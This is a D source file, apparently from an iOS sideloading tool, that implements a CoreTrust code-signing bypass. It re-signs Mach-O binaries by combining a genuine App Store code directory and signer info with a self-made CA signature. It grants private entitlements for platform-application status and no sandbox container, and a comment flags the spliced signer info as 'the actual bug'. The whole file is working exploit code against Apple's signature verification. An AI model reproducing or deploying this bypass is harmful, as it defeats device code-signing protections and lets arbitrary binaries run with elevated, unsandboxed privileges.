module sideload.ct_bypass;

import std.algorithm;
import std.array;
import std.datetime;
import std.exception;

import botan.asn1.asn1_time;
import botan.asn1.der_enc;
import botan.asn1.oids;
import botan.cert.x509.x509cert;
import botan.hash.mdx_hash;
import botan.libstate.lookup;
import botan.pubkey.algo.rsa;

import plist;

import sideload.applecert;
import sideload.appstore_code_dir;
import sideload.certificateidentity;
import sideload.macho;

void bypassCoreTrust(MachO machO) {
    auto appStoreData = cast(ubyte[]) appStoreCodeDirectory[];
    auto appStoreBlob = new RawBlob(CSSLOT_CODEDIRECTORY, appStoreData);
    auto appStoreCodeDir = CodeDirectoryBlob.decode(appStoreData);
    auto teamId = appStoreCodeDir.teamId;
    auto bundleId = appStoreCodeDir.bundleId;
    auto requirementsBlob = new RequirementsBlob();

    MDxHashFunction sha1 = cast(MDxHashFunction) retrieveHash("SHA-1");
    MDxHashFunction sha2 = cast(MDxHashFunction) retrieveHash("SHA-256");

    Blob codeDir1;
    Blob codeDir2;

    PlistDict entitlements = [
        "platform-application": true.pl,
        "com.apple.private.security.no-container": true.pl
    ].pl;

    codeDir1 = appStoreBlob;// new CodeDirectoryBlob(sha1, bundleId, teamId, machO, entitlements, null, null);
    codeDir2 = new CodeDirectoryBlob(sha2, bundleId, teamId, machO, entitlements, null, null, true);

    auto embeddedSignature = new EmbeddedSignature();
    embeddedSignature.blobs = cast(Blob[]) [
        requirementsBlob,
        new EntitlementsBlob(entitlements.toXml())
    ];

    if (machO.filetype == MH_EXECUTE) {
        embeddedSignature.blobs ~= new DerEntitlementsBlob(entitlements);
    }

    RandomNumberGenerator rng = RandomNumberGenerator.makeRng();
    DataSource source = cast(DataSource) DataSourceMemory(cast(string) CAKey);
    Vector!ubyte caCertVec = Vector!ubyte(CACert);
    embeddedSignature.blobs ~= cast(Blob[]) [
        codeDir1,
        codeDir2,
        new TrollSignatureBlob(new CertificateIdentity(X509Certificate(caCertVec, false), RSAPrivateKey(loadKey(source, rng))), [null, sha1, sha2])
    ];

    machO.replaceCodeSignature(new ubyte[](embeddedSignature.length()));

    auto encodedBlob = embeddedSignature.encode();
    enforce(!machO.replaceCodeSignature(encodedBlob));
}

class TrollSignatureBlob: SignatureBlob {
    this(CertificateIdentity identity, MDxHashFunction[] hashers) {
        super(identity, hashers);
    }


    override uint length() => 10000;

    override ref DEREncoder encodeBlob(return ref DEREncoder der, ubyte[][] codeDirectories) {
        // copy pasted from macho.d
        OIDS.setDefaults();

        auto rng = identity.rng;
        PKSigner signer = PKSigner(identity.privateKey, "EMSA3(SHA-256)");

        X509Certificate appleWWDRCert = X509Certificate(Vector!ubyte(appleWWDRG3));
        X509Certificate appleRootCA = X509Certificate(Vector!ubyte(appleRoot));

        enforce(identity.certificate, "Certificate is null!!");

        ubyte codeDirHashType(ubyte[] codeDir) pure {
            return (cast(CodeDirectoryBlob.CS_CodeDirectory*) codeDir.ptr).hashType;
        }

        auto signedAttrs = DEREncoder()
                // Attribute
                .startCons(ASN1Tag.SEQUENCE)
                    .encode(OIDS.lookup("PKCS9.ContentType"))
                    .startCons(ASN1Tag.SET)
                        .encode(OIDS.lookup("CMS.DataContent"))
                    .endCons()
                .endCons()
                // Attribute
                .startCons(ASN1Tag.SEQUENCE)
                    .encode(OID("1.2.840.113549.1.9.5")) // SigningTime
                    .startCons(ASN1Tag.SET)
                        .encode(X509Time(Clock.currTime(UTC())))
                    .endCons()
                .endCons()
                // Attribute
                .startCons(ASN1Tag.SEQUENCE)
                    .encode(OIDS.lookup("PKCS9.MessageDigest"))
                    .startCons(ASN1Tag.SET)
                        .encode(hashers[2].process(codeDirectories[0]), ASN1Tag.OCTET_STRING)
                    .endCons()
                .endCons()
                // Attribute
                .startCons(ASN1Tag.SEQUENCE)
                    .encode(OID("1.2.840.113635.100.9.2"))
                    .startCons(ASN1Tag.SET)
                        .startCons(ASN1Tag.SEQUENCE)
                            .encode(OIDS.lookup("SHA-256"))
                            // Don't ask me why I wrote that as is, I just want it to not crash...
                            .encode(hashers[2].process(codeDirectories.filter!((dir) => codeDirHashType(dir) == 2).array()[0]), ASN1Tag.OCTET_STRING)
                        .endCons()
                    .endCons()
                .endCons()
                // Attribute
                .startCons(ASN1Tag.SEQUENCE)
                    .encode(OID("1.2.840.113635.100.9.1"))
                    .startCons(ASN1Tag.SET)
                        .encode(
                            Vector!ubyte(
                                dict(
                                    "cdhashes", codeDirectories.map!(
                                        (codeDir) => hashers[codeDirHashType(codeDir)].process(codeDir)[0..20].dup.pl
                                    ).array().pl
                                ).toXml()[0..$-1]
                            ),
                            ASN1Tag.OCTET_STRING
                        )
                    .endCons()
                .endCons().getContents();

        auto attrToSign = DEREncoder()
            .startCons(ASN1Tag.SET)
                .rawBytes(signedAttrs)
            .endCons()
            .getContents();

        der
            .startCons(ASN1Tag.SEQUENCE).encode(OIDS.lookup("CMS.SignedData"))
                .startCons(ASN1Tag.UNIVERSAL, ASN1Tag.PRIVATE)
                    // SignedData
                    .startCons(ASN1Tag.SEQUENCE)
                        // CMSVersion
                        .encode(size_t(1))
                        // Digest algorithms
                        .startCons(ASN1Tag.SET)
                            // DigestAlgorithmIdentifier
                            .startCons(ASN1Tag.SEQUENCE)
                                .encode(OIDS.lookup("SHA-256"))
                            .endCons()
                        .endCons()
                        // Encapsulated Content Info
                        .startCons(ASN1Tag.SEQUENCE)
                            .encode(OIDS.lookup("CMS.DataContent"))
                        .endCons()
                        // CertificateList OPTIONAL tagged 0x01
                        .rawBytes(appStoreCMSCerts.ptr, appStoreCMSCerts.length)
                        // SignerInfos
                        .startCons(ASN1Tag.SET)
                            .startCons(ASN1Tag.SEQUENCE)
                                // CMSVersion
                                .encode(size_t(1))
                                // IssuerAndSerialNumber ::= SignerIdentifier
                                .startCons(ASN1Tag.SEQUENCE)
                                    // Name
                                    .rawBytes(identity.certificate.rawIssuerDn())
                                    // Serial number
                                    .encode(BigInt.decode(identity.certificate.serialNumber()))
                                .endCons()
                                // DigestAlgorithmIdentifier
                                .startCons(ASN1Tag.SEQUENCE)
                                    // Serial number
                                    .encode(OIDS.lookup("SHA-256"))
                                .endCons()
                                // SignedAttributes
                                .startCons(cast(ASN1Tag) 0x0, ASN1Tag.CONTEXT_SPECIFIC)
                                    .rawBytes(signedAttrs)
                                .endCons()
                                // SignatureAlgorithmIdentifier
                                .encode(AlgorithmIdentifier("RSA", false))
                                // SignatureValue
                                .encode(signer.signMessage(attrToSign, rng), ASN1Tag.OCTET_STRING)
                            .endCons()
                            // THE ACTUAL BUG!!
                            .rawBytes(appStoreSignerInfo.ptr, appStoreSignerInfo.length)
                        .endCons()
                    .endCons()
                .endCons()
            .endCons();
        return der;
    }
}
